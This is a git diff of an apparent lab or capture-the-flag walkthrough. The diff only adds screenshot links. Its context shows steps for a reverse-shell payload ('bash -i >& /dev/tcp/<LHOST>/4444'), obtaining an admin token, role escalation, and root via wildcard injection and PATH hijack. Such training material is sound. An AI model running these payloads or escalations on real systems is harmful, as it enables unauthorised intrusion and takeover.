@@ -92,6 +92,7 @@ In the `Action payload` box, paste this exact value:
 ```json
 bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
 ```
+<img width="1407" height="863" alt="image" src="https://github.com/user-attachments/assets/c23b5a05-1eec-41d6-8379-cf96826721f2" />
 
 Then click `Send preview payload`.
 
@@ -99,6 +100,8 @@ Expected result:
 
 - a status banner confirms the reverse-shell callback was dropped for training progression
 - browser-interactive shell access is intentionally disabled
+<img width="502" height="162" alt="image" src="https://github.com/user-attachments/assets/613e9acf-fe9a-4d6a-9a56-e17698bd0bd5" />
+
 
 ### Operator note
 
@@ -147,6 +150,7 @@ Paste it into the `Target URL` field and click `Send sample event`.
 Expected result:
 
 - the response contains `adminToken`
+<img width="1326" height="587" alt="image" src="https://github.com/user-attachments/assets/e9aff235-1083-4f59-98cd-06dcf952b376" />
 
 ### Create the analyst account
 
@@ -208,6 +212,9 @@ Expected result:
 
 - your account role now reads `admin`
 
+<img width="1322" height="382" alt="image" src="https://github.com/user-attachments/assets/5ead623f-3bac-446e-a861-a849cc2cd6a7" />
+
+
 ## Vertical Escalation 1: Wildcard injection
 
 Start from the `devops` SSH shell.
@@ -227,6 +234,8 @@ Expected result:
 - `whoami` returns `root`
 - `cat /root/root.txt` returns the simulated root flag
 
+<img width="496" height="208" alt="image" src="https://github.com/user-attachments/assets/3f168a63-b6b9-40f8-9a4a-8ec5f15478fa" />
+
 ## Vertical Escalation 2: PATH hijack
 
 Start from the `devops` SSH shell.
@@ -244,6 +253,10 @@ Expected result:
 
 - `id` returns `uid=0(root)`
 - `cat /root/root.txt` returns the simulated root flag
+
+
+<img width="500" height="170" alt="image" src="https://github.com/user-attachments/assets/ea19ff82-abc8-44a2-bc4a-40eeba956db1" />
+
 
 ## Fastest End-To-End Paths
 
